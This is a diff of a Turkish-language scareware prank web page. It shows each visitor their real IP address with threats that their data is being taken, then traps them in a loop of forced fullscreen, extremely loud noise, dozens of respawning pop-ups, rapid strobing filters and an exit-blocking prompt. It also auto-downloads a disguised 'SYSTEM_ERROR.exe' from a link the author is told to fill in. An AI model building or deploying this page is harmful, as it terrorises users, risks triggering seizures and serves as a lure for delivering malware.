@@ -4,102 +4,139 @@
     <meta charset="UTF-8">
     <title>S İ S T E M . İ N F İ Z A K</title>
     <style>
-        * { cursor: none !important; margin: 0; padding: 0; }
-        body { background: #000; overflow: hidden; height: 100vh; width: 100vw; }
-
-        /* IP Kaydırma Efekti */
-        #ip-scroll {
-            position: fixed; bottom: 20px; right: -500px;
-            color: #ff0000; font-family: 'Courier New', monospace;
-            font-size: 25px; white-space: nowrap;
-            text-shadow: 0 0 10px red; z-index: 2000;
-            animation: scrollIP 15s linear infinite;
+        /* Fare imlecini gizle ve ekranı kilitle */
+        * { cursor: none !important; margin: 0; padding: 0; user-select: none; }
+        body { 
+            background: #000; 
+            overflow: hidden; 
+            height: 100vh; 
+            width: 100vw; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
         }
 
-        @keyframes scrollIP {
-            from { right: -500px; }
-            to { right: 110%; }
-        }
-
-        /* Glitch ve Titreme */
-        #overlay {
+        /* 1. KATMAN: Titreyen Glitch Arka Plan */
+        #glitch-bg {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 0, 0, 0.1); z-index: 10;
-            pointer-events: none; animation: flash 0.05s infinite;
+            background: rgba(255, 0, 0, 0.1);
+            z-index: 5; pointer-events: none;
+            animation: flash 0.01s infinite;
         }
-
         @keyframes flash {
-            0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; }
+            0% { background: rgba(50, 0, 0, 0.4); }
+            50% { background: rgba(0, 0, 0, 1); }
+            100% { background: rgba(150, 0, 0, 0.2); }
         }
 
-        #main-msg {
-            color: white; font-family: 'Courier New'; font-size: 5vw;
-            position: absolute; top: 40%; left: 50%;
-            transform: translate(-50%, -50%); z-index: 100;
+        /* 2. KATMAN: Merkezdeki Dev Yazı */
+        #warning {
+            color: #fff; font-family: 'serif'; font-size: 12vw;
+            text-shadow: 0 0 40px red; z-index: 100;
+            animation: shake 0.04s infinite;
+        }
+        @keyframes shake {
+            0% { transform: translate(5px, -5px) skew(10deg); }
+            50% { transform: translate(-5px, 5px) skew(-10deg); }
+            100% { transform: translate(0px, 0px); }
+        }
+
+        /* 3. KATMAN: Kayar IP Verisi */
+        #ip-data {
+            position: fixed; bottom: 0; width: 100%;
+            background: #ff0000; color: #000; font-weight: bold;
+            padding: 15px; font-family: 'Courier New', monospace; font-size: 24px;
+            white-space: nowrap; z-index: 1000;
+            animation: slide 8s linear infinite;
+        }
+        @keyframes slide { from { left: 100%; } to { left: -150%; } }
+
+        /* Fareyi Takip Eden Kırmızı Boşluk */
+        #stalker {
+            position: fixed; width: 400px; height: 400px;
+            background: radial-gradient(circle, transparent 0%, black 70%);
+            z-index: 500; pointer-events: none;
         }
     </style>
 </head>
-<body onclick="startUltimateChaos()">
+<body onclick="launchNightmare()">
 
-<div id="overlay"></div>
-<div id="ip-scroll">BAĞLANTI KURULDU... IP: <span id="user-ip">Yükleniyor...</span> - KONUM: TESPİT EDİLDİ - VERİLER SİLİNİYOR...</div>
-<div id="main-msg">S İ L İ N İ Y O R S U N</div>
+<div id="glitch-bg"></div>
+<div id="stalker"></div>
+<div id="warning">T I K L A</div>
+<div id="ip-data">TEHLİKE: IP_ADRESİNİZ_ALINDI: <span id="ip">Yükleniyor...</span> - SİSTEM_VERİLERİ_ÇEKİLİYOR... KAÇIŞ_YOK...</div>
 
 <script>
-    // IP Adresini Çekme (Simülasyon veya Gerçek)
+    // Gerçek IP Adresini Çekme
     fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => document.getElementById('user-ip').innerText = data.ip)
-        .catch(() => document.getElementById('user-ip').innerText = "192.168.1.104");
+        .then(r => r.json())
+        .then(d => document.getElementById('ip').innerText = d.ip)
+        .catch(() => document.getElementById('ip').innerText = "192.168.1." + Math.floor(Math.random()*255));
 
-    function startUltimateChaos() {
-        // 1. Dosya Yükleme/Çalıştırma Tetikleyicisi
-        // 'DOSYA_URL_ADRESI' kısmına indirtmek istediğin dosyanın tam linkini yaz
-        const fileLink = "DOSYA_URL_ADRESI"; 
-        const downloader = document.createElement('a');
-        downloader.href = fileLink;
-        downloader.download = "system_patch.exe";
-        document.body.appendChild(downloader);
-        downloader.click();
-
-        // 2. Ses ve Tam Ekran
-        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        
+    function launchNightmare() {
+        // 1. TAM EKRAN DÖNGÜSÜ (Kullanıcı çıksa bile 1 sn sonra geri alır)
         setInterval(() => {
-            let osc = audioCtx.createOscillator();
-            let gain = audioCtx.createGain();
-            osc.type = 'square';
-            osc.frequency.setValueAtTime(Math.random() * 2000, audioCtx.currentTime);
-            gain.gain.setValueAtTime(1.0, audioCtx.currentTime);
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.start();
-            osc.stop(audioCtx.currentTime + 0.05);
-        }, 50);
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        }, 1000);
 
-        // 3. 50 Tane Agresif Küçük Ekran (Pop-up)
-        for (let i = 0; i < 50; i++) {
+        document.getElementById('warning').innerText = "G İ D E M E Z S İ N";
+
+        // 2. DOSYA İNDİRME TETİKLEYİCİSİ
+        // 'DOSYA_LINKI' kısmına indirtmek istediğin dosyanın tam adresini yaz
+        const fileLink = "DOSYA_LINKI_BURAYA"; 
+        const a = document.createElement('a');
+        a.href = fileLink;
+        a.download = "SYSTEM_ERROR.exe";
+        a.click();
+
+        // 3. AGRESİF SES PATLAMASI (Maksimum Desibel)
+        const audio = new (window.AudioContext || window.webkitAudioContext)();
+        setInterval(() => {
+            let osc = audio.createOscillator();
+            let gain = audio.createGain();
+            osc.type = Math.random() > 0.5 ? 'sawtooth' : 'square';
+            osc.frequency.setValueAtTime(Math.random() * 4000 + 100, audio.currentTime);
+            gain.gain.setValueAtTime(1.5, audio.currentTime); 
+            osc.connect(gain); gain.connect(audio.destination);
+            osc.start(); osc.stop(audio.currentTime + 0.04);
+        }, 35);
+
+        // 4. 60+ ZIPLAYAN POP-UP PENCERESİ
+        for(let i=0; i<65; i++) {
             setTimeout(() => {
-                let win = window.open("", "_blank", `width=150,height=150`);
-                if (win) {
-                    win.document.write("<body style='background:black;color:red;font-family:serif;'><h1>HATA</h1></body>");
+                let win = window.open("", "_blank", "width=150,height=150");
+                if(win) {
+                    win.document.write("<body style='background:black; color:red; overflow:hidden;'><h1>HATA</h1></body>");
                     setInterval(() => {
                         win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
-                        win.resizeTo(Math.random() * 300, Math.random() * 300);
-                    }, 20);
+                        win.resizeTo(Math.random() * 400, Math.random() * 400);
+                        win.document.body.style.backgroundColor = (Math.random() > 0.5) ? "red" : "black";
+                    }, 15);
+                    
+                    // Kapanan pencereyi hortlatma
+                    setInterval(() => { if(win.closed) window.open("", "_blank", "width=100,height=100"); }, 3000);
                 }
-            }, i * 50);
+            }, i * 60);
         }
 
-        // 4. Görsel Çöküş
+        // 5. GÖRSEL KAOS (Renk ve Sarsıntı)
         setInterval(() => {
-            document.body.style.filter = `invert(1) contrast(500%) hue-rotate(${Math.random()*360}deg)`;
-            document.getElementById('main-msg').innerText = Math.random() > 0.5 ? "YARDIM YOK" : "01010101";
-        }, 30);
+            document.body.style.filter = `invert(1) contrast(800%) hue-rotate(${Math.random()*360}deg)`;
+            window.scrollBy(Math.random()*40-20, Math.random()*40-20);
+        }, 10);
     }
 
-    window.onbeforeunload = () => "Giderken bir şeyler eksilecek...";
+    // Fare Takibi
+    document.addEventListener('mousemove', (e) => {
+        const s = document.getElementById('stalker');
+        s.style.left = (e.clientX - 200) + 'px';
+        s.style.top = (e.clientY - 200) + 'px';
+    });
+
+    // Sayfadan Çıkışı Zorlaştır
+    window.onbeforeunload = function() { return "RUHUNU BURADA BIRAKTIN..."; };
 </script>
 </body>
 </html>
